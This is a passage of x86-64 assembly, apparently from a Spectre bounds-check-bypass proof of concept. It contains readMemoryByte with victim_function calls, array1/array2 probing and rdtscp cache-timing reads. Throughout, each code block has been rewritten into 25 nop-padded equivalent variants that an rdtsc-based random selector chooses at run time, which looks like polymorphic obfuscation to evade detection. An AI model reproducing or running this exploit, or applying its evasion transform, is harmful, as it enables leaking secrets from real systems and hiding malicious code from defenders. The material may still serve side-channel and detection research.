.LreadMemoryByte_win6_continue:
LBB1_13:                                ##   Parent Loop BB1_5 Depth=1
                                        ##     Parent Loop BB1_11 Depth=2
                                        ## =>    This Inner Loop Header: Depth=3
	movl	-116(%rbp), %eax
	cmpl	$1000, %eax    # # imm = 0x3E8
	jge	LBB1_16
## %bb.14:                              ##   in Loop: Header=BB1_13 Depth=3
	jmp	LBB1_15
LBB1_15:                                ##   in Loop: Header=BB1_13 Depth=3
	movl	-116(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -116(%rbp)
	jmp	LBB1_13
LBB1_16:                                ##   in Loop: Header=BB1_11 Depth=2
	movl	-60(%rbp), %eax
	movl	$6, %ecx
	cltd
	idivl	%ecx
	movl	%edx, %eax
	subl	$1, %eax
	andl	$-65536, %eax    # # imm = 0xFFFF0000
	cltq
	movq	%rax, -88(%rbp)
	movq	-88(%rbp), %rax
	movq	-88(%rbp), %rcx
	shrq	$16, %rcx
	orq	%rcx, %rax
	movq	%rax, -88(%rbp)
	movq	-80(%rbp), %rax
	movq	-88(%rbp), %rcx
	movq	-32(%rbp), %rdx
	xorq	-80(%rbp), %rdx
	andq	%rdx, %rcx
	xorq	%rcx, %rax
	movq	%rax, -88(%rbp)
	movq	-88(%rbp), %rdi
	callq	_victim_function
## %bb.17:                              ##   in Loop: Header=BB1_11 Depth=2
	movl	-60(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -60(%rbp)
	jmp	LBB1_11
LBB1_18:                                ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
LBB1_19:                                ##   Parent Loop BB1_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$25, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win5_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win5_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win5_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win5_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win5_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win5_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win5_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win5_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win5_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win5_var9
	cmpl	$10, %eax
	je	.LreadMemoryByte_win5_var10
	cmpl	$11, %eax
	je	.LreadMemoryByte_win5_var11
	cmpl	$12, %eax
	je	.LreadMemoryByte_win5_var12
	cmpl	$13, %eax
	je	.LreadMemoryByte_win5_var13
	cmpl	$14, %eax
	je	.LreadMemoryByte_win5_var14
	cmpl	$15, %eax
	je	.LreadMemoryByte_win5_var15
	cmpl	$16, %eax
	je	.LreadMemoryByte_win5_var16
	cmpl	$17, %eax
	je	.LreadMemoryByte_win5_var17
	cmpl	$18, %eax
	je	.LreadMemoryByte_win5_var18
	cmpl	$19, %eax
	je	.LreadMemoryByte_win5_var19
	cmpl	$20, %eax
	je	.LreadMemoryByte_win5_var20
	cmpl	$21, %eax
	je	.LreadMemoryByte_win5_var21
	cmpl	$22, %eax
	je	.LreadMemoryByte_win5_var22
	cmpl	$23, %eax
	je	.LreadMemoryByte_win5_var23
	cmpl	$24, %eax
	je	.LreadMemoryByte_win5_var24
	jmp	.LreadMemoryByte_win5_var0
## Variant 0
.LreadMemoryByte_win5_var0:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 1
.LreadMemoryByte_win5_var1:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	nop
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 2
.LreadMemoryByte_win5_var2:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	nop
	movl	%eax, -68(%rbp)
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 3
.LreadMemoryByte_win5_var3:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 4
.LreadMemoryByte_win5_var4:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 5
.LreadMemoryByte_win5_var5:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	nop
	movl	%eax, -68(%rbp)
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 6
.LreadMemoryByte_win5_var6:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	nop
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 7
.LreadMemoryByte_win5_var7:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
	nop
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 8
.LreadMemoryByte_win5_var8:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	nop
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	nop
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 9
.LreadMemoryByte_win5_var9:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
	nop
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 10
.LreadMemoryByte_win5_var10:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	nop
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 11
.LreadMemoryByte_win5_var11:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	nop
	nop
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 12
.LreadMemoryByte_win5_var12:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 13
.LreadMemoryByte_win5_var13:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	nop
	movl	%eax, -68(%rbp)
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 14
.LreadMemoryByte_win5_var14:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 15
.LreadMemoryByte_win5_var15:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 16
.LreadMemoryByte_win5_var16:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 17
.LreadMemoryByte_win5_var17:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	nop
	addl	$13, %eax
	nop
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 18
.LreadMemoryByte_win5_var18:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	nop
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 19
.LreadMemoryByte_win5_var19:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 20
.LreadMemoryByte_win5_var20:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	nop
	movl	%eax, -68(%rbp)
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 21
.LreadMemoryByte_win5_var21:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 22
.LreadMemoryByte_win5_var22:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 23
.LreadMemoryByte_win5_var23:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 24
.LreadMemoryByte_win5_var24:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win5_continue
.LreadMemoryByte_win5_continue:
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	addq	%rcx, %rax
	movq	%rax, -112(%rbp)
	leaq	-72(%rbp), %rax
	movq	%rax, -8(%rbp)
	movq	-8(%rbp), %rax
	movq	%rax, -136(%rbp)    # # 8-byte Spill
	rdtscp
	movq	%rdx, %rsi
	movl	%ecx, %edx
	movq	-136(%rbp), %rcx    # # 8-byte Reload
	shlq	$32, %rsi
	orq	%rsi, %rax
	movl	%edx, (%rcx)
	movq	%rax, -96(%rbp)
	movq	-112(%rbp), %rax
	movb	(%rax), %al
	movzbl	%al, %eax
	movl	%eax, -72(%rbp)
	leaq	-72(%rbp), %rax
	movq	%rax, -16(%rbp)
	movq	-16(%rbp), %rax
	movq	%rax, -128(%rbp)    # # 8-byte Spill
	rdtscp
	movq	%rdx, %rsi
	movl	%ecx, %edx
	movq	-128(%rbp), %rcx    # # 8-byte Reload
	shlq	$32, %rsi
	orq	%rsi, %rax
	movl	%edx, (%rcx)
	subq	-96(%rbp), %rax
	movq	%rax, -104(%rbp)
	movq	-104(%rbp), %rax
                                        ## kill: def $eax killed $eax killed $rax
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$25, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win4_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win4_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win4_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win4_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win4_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win4_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win4_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win4_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win4_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win4_var9
	cmpl	$10, %eax
	je	.LreadMemoryByte_win4_var10
	cmpl	$11, %eax
	je	.LreadMemoryByte_win4_var11
	cmpl	$12, %eax
	je	.LreadMemoryByte_win4_var12
	cmpl	$13, %eax
	je	.LreadMemoryByte_win4_var13
	cmpl	$14, %eax
	je	.LreadMemoryByte_win4_var14
	cmpl	$15, %eax
	je	.LreadMemoryByte_win4_var15
	cmpl	$16, %eax
	je	.LreadMemoryByte_win4_var16
	cmpl	$17, %eax
	je	.LreadMemoryByte_win4_var17
	cmpl	$18, %eax
	je	.LreadMemoryByte_win4_var18
	cmpl	$19, %eax
	je	.LreadMemoryByte_win4_var19
	cmpl	$20, %eax
	je	.LreadMemoryByte_win4_var20
	cmpl	$21, %eax
	je	.LreadMemoryByte_win4_var21
	cmpl	$22, %eax
	je	.LreadMemoryByte_win4_var22
	cmpl	$23, %eax
	je	.LreadMemoryByte_win4_var23
	cmpl	$24, %eax
	je	.LreadMemoryByte_win4_var24
	jmp	.LreadMemoryByte_win4_var0
## Variant 0
.LreadMemoryByte_win4_var0:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 1
.LreadMemoryByte_win4_var1:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	leaq	-52(%rbp), %r10
	movl	(%r10), %eax
	nop
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 2
.LreadMemoryByte_win4_var2:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	leaq	-52(%rbp), %r10
	movl	(%r10), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 3
.LreadMemoryByte_win4_var3:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	leaq	-52(%rbp), %r10
	movl	(%r10), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 4
.LreadMemoryByte_win4_var4:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	leaq	-52(%rbp), %r10
	movl	(%r10), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 5
.LreadMemoryByte_win4_var5:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	leaq	-52(%rbp), %r10
	movl	(%r10), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 6
.LreadMemoryByte_win4_var6:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	leaq	-52(%rbp), %r10
	movl	(%r10), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 7
.LreadMemoryByte_win4_var7:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	leaq	-68(%rbp), %r10
	nop
	movl	(%r10), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	leaq	-52(%rbp), %r10
	movl	(%r10), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 8
.LreadMemoryByte_win4_var8:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	leaq	-52(%rbp), %r10
	movl	(%r10), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 9
.LreadMemoryByte_win4_var9:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	leaq	-52(%rbp), %r10
	movl	(%r10), %eax
	nop
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 10
.LreadMemoryByte_win4_var10:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	leaq	-52(%rbp), %r10
	movl	(%r10), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 11
.LreadMemoryByte_win4_var11:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	leaq	-52(%rbp), %r10
	nop
	movl	(%r10), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 12
.LreadMemoryByte_win4_var12:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
	nop
	nop
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	leaq	-68(%rbp), %r10
	nop
	movl	(%r10), %eax
	nop
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	leaq	-52(%rbp), %r10
	movl	(%r10), %eax
	xorl	%edx, %edx
	nop
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 13
.LreadMemoryByte_win4_var13:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 14
.LreadMemoryByte_win4_var14:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 15
.LreadMemoryByte_win4_var15:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 16
.LreadMemoryByte_win4_var16:
	popq	%rax
	nop
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
	nop
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	leaq	-52(%rbp), %r10
	movl	(%r10), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 17
.LreadMemoryByte_win4_var17:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
	nop
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	nop
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 18
.LreadMemoryByte_win4_var18:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	nop
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	leaq	-52(%rbp), %r10
	movl	(%r10), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 19
.LreadMemoryByte_win4_var19:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	leaq	-52(%rbp), %r10
	movl	(%r10), %eax
	nop
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 20
.LreadMemoryByte_win4_var20:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	leaq	-52(%rbp), %r10
	movl	(%r10), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 21
.LreadMemoryByte_win4_var21:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	leaq	-52(%rbp), %r10
	movl	(%r10), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 22
.LreadMemoryByte_win4_var22:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	leaq	-52(%rbp), %r10
	movl	(%r10), %eax
	xorl	%edx, %edx
	nop
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 23
.LreadMemoryByte_win4_var23:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
	nop
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	leaq	-52(%rbp), %r10
	movl	(%r10), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 24
.LreadMemoryByte_win4_var24:
	popq	%rax
	nop
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	leaq	-68(%rbp), %r10
	movl	(%r10), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	leaq	-52(%rbp), %r10
	movl	(%r10), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
.LreadMemoryByte_win4_continue:
	movl	-140(%rbp), %eax    # # 4-byte Reload
	movl	%edx, %ecx
	movl	%ecx, %edx
	leaq	_array1(%rip), %rcx
	movzbl	(%rcx,%rdx), %ecx
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$25, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win3_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win3_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win3_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win3_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win3_var4
	cmpl	$5, %eax
